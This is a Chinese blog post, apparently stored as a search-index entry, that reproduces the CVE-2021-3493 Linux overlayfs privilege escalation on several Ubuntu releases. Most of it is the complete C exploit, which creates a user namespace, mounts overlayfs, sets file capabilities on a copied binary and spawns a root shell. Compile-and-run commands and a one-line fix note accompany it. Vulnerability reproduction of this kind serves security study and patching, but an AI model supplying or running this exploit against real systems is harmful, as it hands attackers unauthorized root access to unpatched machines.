-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Ubuntu 20.10<br>Ubuntu 20.04 LTS<br>Ubuntu 18.04 LTS<br>Ubuntu 16.04 LTS<br>Ubuntu 14.04 ESM</p>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre class="line-numbers language-none"><code class="language-none">uname -a              显示电脑以及操作系统的相关信息
-cat &#x2F;etc&#x2F;issue        显示发行版本信息
-cat &#x2F;proc&#x2F;version     显示正在运行的内核版本
-lsb_release -a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/images/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/1.png" alt="图片"></p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><pre class="line-numbers language-none"><code class="language-none">gcc exploit.c -o exploit     编译
-chmod +x exploit             给执行权限
-.&#x2F;exploit                    执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>可以看到前后权限有所提升，用户权限–&gt;管理员权限<br><img src="/images/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/2.png" alt="图片"></p>
-<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><p><a href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;exploit.c
-#define _GNU_SOURCE
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;fcntl.h&gt;
-#include &lt;err.h&gt;
-#include &lt;errno.h&gt;
-#include &lt;sched.h&gt;
-#include &lt;sys&#x2F;types.h&gt;
-#include &lt;sys&#x2F;stat.h&gt;
-#include &lt;sys&#x2F;wait.h&gt;
-#include &lt;sys&#x2F;mount.h&gt;
-
-&#x2F;&#x2F;#include &lt;attr&#x2F;xattr.h&gt;
-&#x2F;&#x2F;#include &lt;sys&#x2F;xattr.h&gt;
-int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
-
-
-#define DIR_BASE    &quot;.&#x2F;ovlcap&quot;
-#define DIR_WORK    DIR_BASE &quot;&#x2F;work&quot;
-#define DIR_LOWER   DIR_BASE &quot;&#x2F;lower&quot;
-#define DIR_UPPER   DIR_BASE &quot;&#x2F;upper&quot;
-#define DIR_MERGE   DIR_BASE &quot;&#x2F;merge&quot;
-#define BIN_MERGE   DIR_MERGE &quot;&#x2F;magic&quot;
-#define BIN_UPPER   DIR_UPPER &quot;&#x2F;magic&quot;
-
-
-static void xmkdir(const char *path, mode_t mode)
-&#123;
-    if (mkdir(path, mode) &#x3D;&#x3D; -1 &amp;&amp; errno !&#x3D; EEXIST)
-        err(1, &quot;mkdir %s&quot;, path);
-&#125;
-
-static void xwritefile(const char *path, const char *data)
-&#123;
-    int fd &#x3D; open(path, O_WRONLY);
-    if (fd &#x3D;&#x3D; -1)
-        err(1, &quot;open %s&quot;, path);
-    ssize_t len &#x3D; (ssize_t) strlen(data);
-    if (write(fd, data, len) !&#x3D; len)
-        err(1, &quot;write %s&quot;, path);
-    close(fd);
-&#125;
-
-static void xcopyfile(const char *src, const char *dst, mode_t mode)
-&#123;
-    int fi, fo;
-
-    if ((fi &#x3D; open(src, O_RDONLY)) &#x3D;&#x3D; -1)
-        err(1, &quot;open %s&quot;, src);
-    if ((fo &#x3D; open(dst, O_WRONLY | O_CREAT, mode)) &#x3D;&#x3D; -1)
-        err(1, &quot;open %s&quot;, dst);
-
-    char buf[4096];
-    ssize_t rd, wr;
-
-    for (;;) &#123;
-        rd &#x3D; read(fi, buf, sizeof(buf));
-        if (rd &#x3D;&#x3D; 0) &#123;
-            break;
-        &#125; else if (rd &#x3D;&#x3D; -1) &#123;
-            if (errno &#x3D;&#x3D; EINTR)
-                continue;
-            err(1, &quot;read %s&quot;, src);
-        &#125;
-
-        char *p &#x3D; buf;
-        while (rd &gt; 0) &#123;
-            wr &#x3D; write(fo, p, rd);
-            if (wr &#x3D;&#x3D; -1) &#123;
-                if (errno &#x3D;&#x3D; EINTR)
-                    continue;
-                err(1, &quot;write %s&quot;, dst);
-            &#125;
-            p +&#x3D; wr;
-            rd -&#x3D; wr;
-        &#125;
-    &#125;
-
-    close(fi);
-    close(fo);
-&#125;
-
-static int exploit()
-&#123;
-    char buf[4096];
-
-    sprintf(buf, &quot;rm -rf &#39;%s&#x2F;&#39;&quot;, DIR_BASE);
-    system(buf);
-
-    xmkdir(DIR_BASE, 0777);
-    xmkdir(DIR_WORK,  0777);
-    xmkdir(DIR_LOWER, 0777);
-    xmkdir(DIR_UPPER, 0777);
-    xmkdir(DIR_MERGE, 0777);
-
-    uid_t uid &#x3D; getuid();
-    gid_t gid &#x3D; getgid();
-
-    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) &#x3D;&#x3D; -1)
-        err(1, &quot;unshare&quot;);
-
-    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;setgroups&quot;, &quot;deny&quot;);
-
-    sprintf(buf, &quot;0 %d 1&quot;, uid);
-    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;uid_map&quot;, buf);
-
-    sprintf(buf, &quot;0 %d 1&quot;, gid);
-    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;gid_map&quot;, buf);
-
-    sprintf(buf, &quot;lowerdir&#x3D;%s,upperdir&#x3D;%s,workdir&#x3D;%s&quot;, DIR_LOWER, DIR_UPPER, DIR_WORK);
-    if (mount(&quot;overlay&quot;, DIR_MERGE, &quot;overlay&quot;, 0, buf) &#x3D;&#x3D; -1)
-        err(1, &quot;mount %s&quot;, DIR_MERGE);
-
-    &#x2F;&#x2F; all+ep
-    char cap[] &#x3D; &quot;\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00&quot;;
-
-    xcopyfile(&quot;&#x2F;proc&#x2F;self&#x2F;exe&quot;, BIN_MERGE, 0777);
-    if (setxattr(BIN_MERGE, &quot;security.capability&quot;, cap, sizeof(cap) - 1, 0) &#x3D;&#x3D; -1)
-        err(1, &quot;setxattr %s&quot;, BIN_MERGE);
-
-    return 0;
-&#125;
-
-int main(int argc, char *argv[])
-&#123;
-    if (strstr(argv[0], &quot;magic&quot;) || (argc &gt; 1 &amp;&amp; !strcmp(argv[1], &quot;shell&quot;))) &#123;
-        setuid(0);
-        setgid(0);
-        execl(&quot;&#x2F;bin&#x2F;bash&quot;, &quot;&#x2F;bin&#x2F;bash&quot;, &quot;--norc&quot;, &quot;--noprofile&quot;, &quot;-i&quot;, NULL);
-        err(1, &quot;execl &#x2F;bin&#x2F;bash&quot;);
-    &#125;
-
-    pid_t child &#x3D; fork();
-    if (child &#x3D;&#x3D; -1)
-        err(1, &quot;fork&quot;);
-
-    if (child &#x3D;&#x3D; 0) &#123;
-        _exit(exploit());
-    &#125; else &#123;
-        waitpid(child, NULL, 0);
-    &#125;
-
-    execl(BIN_UPPER, BIN_UPPER, &quot;shell&quot;, NULL);
-    err(1, &quot;execl %s&quot;, BIN_UPPER);
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>更新Linux内核至5.11</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s/joPEtxkeffhpVjGYaqVApw">https://mp.weixin.qq.com/s/joPEtxkeffhpVjGYaqVApw</a><br><a href="https://blog.csdn.net/Appleteachers/article/details/116018035">https://blog.csdn.net/Appleteachers/article/details/116018035</a></p>
-]]></content>
-      <categories>
-        <category>Linux安全</category>
-        <category>系统安全</category>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>2021.4</tag>
       </tags>
   </entry>
   <entry>
